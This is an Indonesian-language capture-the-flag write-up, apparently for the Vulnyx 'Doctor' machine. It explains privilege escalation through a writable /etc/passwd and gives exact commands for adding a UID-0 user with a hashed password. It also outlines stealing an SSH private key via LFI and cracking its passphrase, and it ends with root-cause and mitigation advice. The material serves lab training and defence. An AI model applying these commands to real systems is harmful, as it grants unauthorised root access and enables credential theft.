# Catatan Kerentanan: Privilege Escalation via Writable `/etc/passwd`

**Sumber:** Vulnyx — Doctor Walkthrough
**Kategori:** Misconfiguration
**Teknik:** LFI → Bruteforce SSH Key → Passwd Misconfiguration

---

## 1. Ringkasan Kerentanan

Kerentanan ini bukan bug pada software, melainkan kesalahan permission pada file sistem kritis `/etc/passwd`, yang seharusnya hanya bisa ditulis oleh root, tetapi ternyata **writable oleh user biasa**.

## 2. Kenapa Ini Berbahaya?

Format satu baris pada `/etc/passwd`:

```
username:password:UID:GID:comment:home_dir:shell
```

Secara normal, field password berisi `x`, yang menandakan hash password sebenarnya disimpan di `/etc/shadow`. Namun jika `/etc/passwd` bisa ditulis langsung, kita bisa **melewati `/etc/shadow` sepenuhnya** dengan menaruh hash password langsung di field ke-2 — sistem Linux tetap akan menerimanya sebagai valid.

> **Inti masalah:** siapa pun yang bisa menulis ke `/etc/passwd` bisa membuat user baru dengan UID `0` (root) miliknya sendiri.

## 3. Langkah Eksploitasi

### a. Temukan file yang writable

```bash
find / -type f -writable -readable 2>/dev/null | grep -v proc
```

Mencari semua file yang bisa dibaca+ditulis oleh user saat ini, di luar `/proc` agar hasil tidak penuh noise.

### b. Ambil format baris root sebagai template

```bash
cat /etc/passwd | grep root | sed 's/root/inot/g'
```

Hasil: baris baru dengan UID/GID `0`, tapi username diganti milik penyerang.

```
inot:x:0:0:inot:/inot:/bin/bash
```

### c. Buat hash password

```bash
openssl passwd -1 <PASSWORD>
```

Flag `-1` = algoritma MD5-crypt (format `$1$...`), kompatibel dibaca langsung dari field password `/etc/passwd`.

### d. Tulis baris baru ke `/etc/passwd`

```bash
echo 'inot:$1$8Pqdm5nH$i5.lpzQoYI6ZTvcD6Za4b1:0:0:inot:/inot:/bin/bash' >> /etc/passwd
```

> ⚠️ **Penting:** wajib pakai **single quote** (`'...'`), bukan double quote. Dengan double quote, shell akan menginterpretasi `$` sebagai variabel (mis. `$1` dianggap positional parameter) sehingga hash rusak.

### e. Login sebagai user baru

```bash
su inot
```

Karena UID = 0, user ini otomatis mendapat privilege root meski namanya bukan "root".

## 4. Root Cause

- Permission `/etc/passwd` tidak dikunci dengan benar (seharusnya `644`, owner root, hanya writable oleh root).
- Tidak ada validasi/monitoring integritas file sistem kritis.

## 5. Mitigasi

1. Pastikan permission `/etc/passwd` selalu `-rw-r--r--` (644), owner `root:root`.
2. Audit rutin permission file-file sensitif (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, dll).
3. Gunakan file integrity monitoring (AIDE, Tripwire, auditd).
4. Terapkan prinsip least privilege — proses/service tidak perlu akses tulis ke `/etc`.

## 6. Alur Serangan Lengkap (Konteks Machine "Doctor")

1. **LFI** pada `doctor-item.php?include=` → baca `/etc/passwd` untuk enumerasi user.
2. LFI digunakan lagi untuk mencuri `~/.ssh/id_rsa` milik user `admin`.
3. `ssh2john` + `john` (wordlist rockyou.txt) → crack passphrase private key.
4. Login SSH sebagai `admin` → dapat **user flag**.
5. Enumerasi sistem → ditemukan `/etc/passwd` writable.
6. Eksploitasi writable `/etc/passwd` (langkah di atas) → dapat **root flag**.
